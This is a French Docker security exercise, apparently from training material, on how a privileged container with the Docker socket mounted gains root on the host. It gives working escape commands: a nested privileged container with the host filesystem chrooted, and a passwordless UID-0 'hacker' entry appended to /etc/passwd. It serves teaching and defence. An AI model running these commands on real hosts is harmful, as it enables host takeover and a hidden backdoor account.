# **🔹 Exercise 10 Conteneur dangereux : Accès root de l'hôte depuis un conteneur 🚨⚠️**
En **production**, mal configurer un conteneur **peut exposer l’hôte** à des attaques et permettre une **escalade de privilèges**.  

📌 **Problème** : Certains paramètres de lancement permettent à un conteneur de **prendre le contrôle de l’hôte** !  

---

## **1️⃣ Pourquoi c’est dangereux ?**
- **Docker tourne en root** → Un conteneur peut potentiellement exécuter des commandes avec les **droits root** de l’hôte.
- **Accès au socket Docker (`/var/run/docker.sock`)** → Permet au conteneur de **gérer Docker lui-même**, créer d'autres conteneurs, supprimer des fichiers, etc.
- **Montage du système de fichiers de l’hôte** → Le conteneur peut **modifier des fichiers critiques** (`/etc/passwd`, `/root/.ssh`, `/etc/shadow`).
- **Ajout de privilèges avec `--privileged`** → Donne **un accès complet au noyau** du système.

---



## **2️⃣ Conteneur dangereux qui peut obtenir un accès root à l'hôte**
🚨 **Ne testez cela que sur une machine de test** 🚨
### **Prépation**

Créer un fichier secret
```sh
 echo "Supersecret" > secret.txt
 sudo chown root secret.txt 
 sudo chmod 400 secret.txt
 sudo mv secret.txt /etc/secret.txt
 cat /etc/secret.txt 
```


### **📌 Exemple : Accès root à l’hôte via `/var/run/docker.sock`**
1️⃣ **Lancer un conteneur en **mode privilégié** et en exposant le socket Docker** :
```sh
docker run -it --rm \
  --privileged \
  -v /var/run/docker.sock:/var/run/docker.sock \
  alpine sh
```
2️⃣ **Dans le conteneur, créer un nouveau conteneur root privilégié** :
```sh
apk add docker-cli
docker run -it --rm --privileged --net=host --pid=host -v /:/mnt alpine chroot /mnt sh
```
📌 **Résultat attendu** :  
- Vous avez un accès **root complet à l’hôte** depuis le conteneur.
- Vous pouvez **modifier des fichiers système**.

3️⃣ **Test : Ajouter un nouvel utilisateur root sur l’hôte** :
```sh
echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd
```
4️⃣ **Ouvrir une session sur l’hôte avec cet utilisateur** :
```sh
su hacker
```
📌 **Le conteneur a complètement pris le contrôle de l’hôte !** 😱

---

## **3️⃣ Expliquer comment cela fonctionne**
### **🔍 Exploitation de `/var/run/docker.sock`**
Docker expose une **API UNIX (`/var/run/docker.sock`)** qui permet de gérer les conteneurs.  
📌 **Problème** :  
Si un conteneur a accès à ce socket, il peut :
- Lancer **d'autres conteneurs avec des privilèges élevés**.
- **Supprimer des conteneurs** sur l’hôte.
- **Monter tout le système de fichiers de l’hôte**.

### **🔍 Exploitation du mode `--privileged`**
L’option `--privileged` donne au conteneur **tous les privilèges root** :
- **Accès aux périphériques de l’hôte (`/dev`, `/sys`)**.
- **Modification des paramètres du noyau**.
- **Ajout d’interfaces réseau**.
- **Chargement de modules noyau**.

📌 **Conséquence** :
👉 Un attaquant peut **modifier l’OS de l’hôte directement depuis un conteneur** !